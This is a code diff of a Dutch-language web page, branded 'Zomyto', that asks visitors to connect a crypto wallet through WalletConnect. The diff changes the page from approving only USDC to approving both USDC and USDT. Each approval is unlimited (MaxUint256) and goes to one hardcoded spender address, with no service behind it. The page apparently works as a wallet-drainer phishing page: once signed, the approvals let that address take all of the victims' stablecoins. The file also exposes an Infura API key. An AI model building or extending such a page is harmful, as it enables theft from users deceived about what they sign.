@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Eenvoudige Approve via WalletConnect v2</title>
+  <title>Zomyto – Approve USDC & USDT</title>
 
   <!-- Ethers v5 -->
   <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
@@ -13,22 +13,25 @@
   <script src="https://unpkg.com/@web3modal/html@2.7.1/dist/index.umd.js"></script>
 
   <style>
-    body { background:#121212; color:white; font-family:Arial; text-align:center; padding-top:50px;}
-    button { background:#1e88e5; color:white; padding:12px 20px; border:none; border-radius:8px; font-size:1rem; cursor:pointer; margin: 10px;}
+    body { background:#121212; color:white; font-family:Arial, sans-serif; text-align:center; padding-top:50px; }
+    button { background:#1e88e5; color:white; padding:12px 20px; border:none; border-radius:8px; font-size:1rem; cursor:pointer; margin: 10px; }
     button:disabled { background:grey; cursor:not-allowed; }
     #status { margin-top:20px; font-size:0.9rem; color:#ccc; }
   </style>
 </head>
 <body>
 
-  <h1>Eenvoudige USDC Approve</h1>
-  <p>1. Verbind je mobiele wallet (bijv. Exodus) via WalletConnect.<br>2. Klik op "Approve USDC".</p>
+  <h1>Zomyto – Approve Stablecoins</h1>
+  <p>
+    1. Verbind je mobiele wallet (bijv. Exodus) via WalletConnect.<br>
+    2. Klik op <b>Approve USDC &amp; USDT</b> om toestemming te geven aan het Zomyto-contract.
+  </p>
 
   <!-- Web3Modal connect button -->
   <w3m-button></w3m-button>
 
   <div style="margin-top:30px;">
-    <button id="approveBtn" disabled>✅ Approve USDC</button>
+    <button id="approveBtn" disabled>✅ Approve USDC &amp; USDT</button>
   </div>
 
   <div id="status">Status: Niet verbonden</div>
@@ -41,10 +44,13 @@
     const CHAIN_ID = 1;
     const RPC_URL = "https://mainnet.infura.io/v3/1506833c04954b058aad864f0d9ce1a2";
 
-    // USDC mainnet
-    const USDC_ADDRESS = "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48";
+    // ERC20 tokens op mainnet
+    const TOKENS = [
+      { name: "USDC", address: "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48" },
+      { name: "USDT", address: "0xdAC17F958D2ee523a2206206994597C13D831ec7" }
+    ];
 
-    // SPENDER: vervang dit door jouw contract/adres dat USDC mag uitgeven
+    // JOUW contract dat toestemming krijgt
     const SPENDER = "0x2F6DAC950c8e2433734Fe50bC72F18E2d2dD8f2A";
 
     const tokenABI = [
@@ -142,16 +148,19 @@
       }
 
       try {
-        setStatus("Verstuur USDC approve transactie...");
-        const usdc = new ethers.Contract(USDC_ADDRESS, tokenABI, signer);
+        for (const t of TOKENS) {
+          setStatus(`Verstuur approve transactie voor ${t.name}...`);
+          const token = new ethers.Contract(t.address, tokenABI, signer);
 
-        // MaxUint256 = onbeperkt
-        const tx = await usdc.approve(SPENDER, ethers.constants.MaxUint256);
-        setStatus("Wachten op bevestiging van de transactie...");
-        await tx.wait();
+          // MaxUint256 = onbeperkte toestemming
+          const tx = await token.approve(SPENDER, ethers.constants.MaxUint256);
+          setStatus(`Wachten op bevestiging van ${t.name} transactie...`);
+          await tx.wait();
+          console.log(`✅ Approved ${t.name}`);
+        }
 
-        setStatus("USDC succesvol goedgekeurd!");
-        alert("USDC succesvol goedgekeurd!");
+        setStatus("USDC & USDT succesvol goedgekeurd!");
+        alert("USDC & USDT succesvol goedgekeurd!");
       } catch (err) {
         console.error(err);
         setStatus("Fout bij approve: " + err.message);
